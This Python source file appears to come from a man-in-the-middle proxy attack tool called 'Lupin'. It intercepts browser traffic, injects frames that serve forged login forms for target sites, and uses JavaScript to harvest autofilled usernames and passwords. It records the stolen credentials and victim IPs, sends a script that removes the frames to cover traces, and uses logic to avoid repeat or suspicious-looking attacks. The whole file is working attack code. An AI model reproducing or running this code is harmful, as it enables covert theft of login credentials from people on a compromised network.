
import urlparse, os, sys, random, time

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

#from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
#from URLMonitor import URLMonitor
from persistentData import persistentData

class ClientRequest(Request):

    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        #self.urlMonitor    = URLMonitor.getInstance()
        self.persistentData      = persistentData.getInstance()
		

    def process(self):
        host     = self.getHeader('host') 
        deferred = self.resolveHost(host)
        deferred.addCallback(self.resolved)
        deferred.addErrback(self.resolvedError)
        

    def resolveHost(self, host):
        address = self.persistentData.getDnsCache(host)
        if address != None:
            return defer.succeed(address)
        else:
            return reactor.resolve(host)


    def resolvedError(self, error):
	try:
		self.finish()
	except:
		print "111"

    def resolved(self, address):
        host              = self.getHeader("host")
        path              = self.getPathFromUri()

	try:
        	self.content.seek(0,0)
        	postData          = self.content.read()
	except:
		print "wtf!!!! "+host        
	url               = 'http://' + host + path
        headers           = self.stripHeader()
        agent             = self.getHeader("user-agent").upper()        

 	if "sendMasterFrame_Lupin" in path:
            self.sendMasterFrame()
            return	

	if "sendForgery_Lupin" in url:     
           self.sendForgery(host) 
           return
 	
	if "sendOK_Lupin" in path:
	    if "saveCreds_Lupin" in path:
 	    	self.saveCreds()
            self.sendOK()
	    return

	if "sendCleanUp_Lupin" in path:
 	    if "saveCreds_Lupin" in path:
 	    	self.saveCreds()
            self.sendCleanUp()

	    '''
	    vics = open("victims/victims.txt",'a')
            vics.write(client+"\n")        
            vics.close()  
            '''
            self.persistentData.addVictim(self.getClientIP())

            return	
             

        self.persistentData.addDnsCache(host, address)

        actAs = "evilProxy"
        if self.doNotAttack(host,path,agent) == True:
	   actAs = "goodProxy"  

        self.proxy(address, self.method, path, postData,actAs, headers)           


    # returns True when the client request should be proxied cleanly
    def doNotAttack(self,host,path,agent):
        client            = self.getClientIP()


	# only works on Firefox/Chrome
        if "CHROME/" not in agent and "FIREFOX/" not in agent:
            return True

        if self.persistentData.shutOff():
		return True
  
        if self.persistentData.oldVictim(client):
		print "old news"
		return True

	# only attach to "GET" requests	
	if self.method != "GET":
		return True

	lastAttack = self.persistentData.getLastAttackTime(client)
	if time.time() - lastAttack < 15:
		print "idling..."
		return True
	
        if len(path) > 50:
		return True
	
	if "google" in host and "/complete/search?" in path:
		return True;

	if '.' in path and ".html" not in path and ".php" not in path:
		return True
	
	return False





    def proxy(self, host, method, path, postData,actAs,headers):
        connectionFactory          = ServerConnectionFactory(method, path, postData, actAs,headers,self)
   	connectionFactory.protocol = ServerConnection
        self.reactor.connectTCP(host, 80, connectionFactory)


    def stripHeader(self):
        headers = self.getAllHeaders().copy()        
        if 'accept-encoding' in headers:
            del headers['accept-encoding']

        return headers


    def getPathFromUri(self):
        if self.uri.startswith("http://"):
            index = self.uri.find('/', 7)
            return self.uri[index:]
        return self.uri        
      

   
    # received stolen credentials ... save them
    def saveCreds(self):
	print "wtf"
        path 	= self.getPathFromUri()
        k 	= path.find('saveCreds_Lupin=')
        path	= path[k+16:]

        if len(path) == 0:
            print "STOLE NOTHING"
            return
       
        path = path.split("|||||")
        for cred in path:
	   if '|' in cred:
              print "STOLE: "+cred[1:]
	      stolenCredentials = open("stolenCredentials.txt",'a');
	      #stolenCredentials.write(cred[1:])
	      stolenCredentials.close()


    # send a 'dummy' OK response. (So that client browser does not hang on a request)
    def sendOK(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
        self.write("<html><head></head><body></body></html>")    
        self.finish() 

        
    # attack over, send signal to cleanup evidence.. (destroys all frames...)
    def sendCleanUp(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close") 
        self.write("<html><head> \
			<script type=\"text/javascript\"> \
				window.parent.postMessage(\"destroyMasterFrame\",\'*\'); \
			</script> \
		    </head><body></body></html>")  
  
        self.finish()   
	print "DONE!!!" 


    # client requested a target, respond with a forged login form, and script to steal credentials.
    def sendForgery(self,host):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "close")   
	
	action = self.persistentData.getLoginAction(host)
	data = "<html><head></head><body> \
			<form method='POST' action="+action+"> \
				<input type='text' name='user'/> \
				<input type='password' name='pass'/> \
			</form> \
			<script type=\"text/javascript\"> \
			function steal(){ \
    				user=document.getElementsByName('user')[0].value; \
    				pass=document.getElementsByName('pass')[0].value; \
    				host=location.hostname; \
    				if(pass.length > 0){ \
        				window.parent.postMessage(window.name+'$$$'+host+','+user+','+pass,'*'); \
				}else{ \
					window.parent.postMessage(window.name+'$$$', '*') \    					} \
			} \
			setTimeout('steal()',100); \
			</script> \
		</body></html>"
    
        self.write(data)
	try:
        	self.finish()
	except:
		"shits dead"      
     

    # send all data needed for frames to operate. This includes the list of targets + scripts to cycle through them
    def sendMasterFrame(self):
        self.setResponseCode(200, "OK")
        self.setHeader("Connection", "keep-alive")
        slaveFrame = open("Lupin/slaveFrame.js",'r+')
        masterFrame =  "<html><head><script type=\"text/javascript\">var targets=["+self.persistentData.getObfuscatedHosts()+"];"+slaveFrame.read() + "</script></head><body onload=\"init();\"></body></html>"


        slaveFrame.close()
        self.write(masterFrame)
        self.finish()
